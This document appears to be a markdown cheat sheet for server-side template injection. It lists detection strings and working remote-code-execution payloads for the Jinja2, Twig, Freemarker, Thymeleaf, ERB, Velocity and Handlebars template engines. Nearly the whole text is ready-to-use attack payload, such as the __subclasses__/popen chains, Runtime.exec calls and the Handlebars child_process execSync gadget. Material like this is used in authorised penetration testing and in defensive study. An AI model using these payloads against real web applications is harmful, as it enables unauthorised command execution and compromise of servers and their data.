# Detect
## Special characters
```
{
}
$
#
@
%)
"
'
|
{{
}}
${
<%
<%=
%>
```

## [Template Expressions - Seclist ](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/template-engines-expression.txt) :
```
42*42  
{42*42}  
{{42*42}}  
{{{42*42}}}  
#{42*42}  
${42*42}  
<%=42*42 %>  
{{=42*42}}  
{^xyzm42}1764{/xyzm42}  
${donotexists|42*42}  
[[${42*42}]]
```

# Escalate
## [Template Special Vars](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/template-engines-special-vars.txt)

# RCE examples

**Jinja2 (Python - Flask, Ansible):**

```python
# Detection
{{7*7}}                              # Returns 49
{{7*'7'}}                            # Returns 7777777

# Reconnaissance
{{config}}
{{config.items()}}
{{self}}
{%debug%}

# RCE via __subclasses__
{{''.__class__.__mro__[1].__subclasses__()}}

# Find useful classes
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('whoami').read()}}

# subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Modern bypass (Python 3)
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}

# Lipsum object abuse
{{lipsum.__globals__['os'].popen('whoami').read()}}

# Cycler object
{{cycler.__init__.__globals__.os.popen('whoami').read()}}
```

**Twig (PHP - Symfony):**

```twig
# Detection
{{7*7}}

# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("whoami")}}

# Alternative
{{_self.env.enableDebug()}}
{{_self.env.isDebug()}}

# PHP filter chain (modern)
{{["id"]|filter("system")}}
```

**Freemarker (Java):**

```java
# Detection
${7*7}

# RCE
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("whoami")}

# Alternative
<#assign classLoader=object?api.class.protectionDomain.classLoader>
<#assign clazz=classLoader.loadClass("java.lang.Runtime")>
<#assign method=clazz.getMethod("getRuntime",null)>
<#assign runtime=method.invoke(null,null)>
<#assign method=clazz.getMethod("exec",classLoader.loadClass("java.lang.String"))>
${method.invoke(runtime,"whoami")}
```

**Thymeleaf (Java - Spring):**

```java
# Detection
[[${7*7}]]

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
[[${T(java.lang.Runtime).getRuntime().exec('whoami')}]]

# Spring EL alternative
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}
```

**ERB (Ruby - Rails):**

```ruby
# Detection
<%= 7*7 %>

# RCE
<%= system("whoami") %>
<%= `whoami` %>
<%= IO.popen('whoami').readlines() %>
<%= %x(whoami) %>
```

**Velocity (Java):**

```java
# Detection
#set($x = 7 * 7)$x

# RCE
#set($rt = $class.forName("java.lang.Runtime"))
#set($chr = $class.forName("java.lang.Character"))
#set($str = $class.forName("java.lang.String"))
#set($ex=$rt.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$chr.toString($out.read())
#end
```

**Handlebars (JavaScript/Node.js):**

```javascript
# Detection
{{7*7}}

# RCE (if helper is vulnerable)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
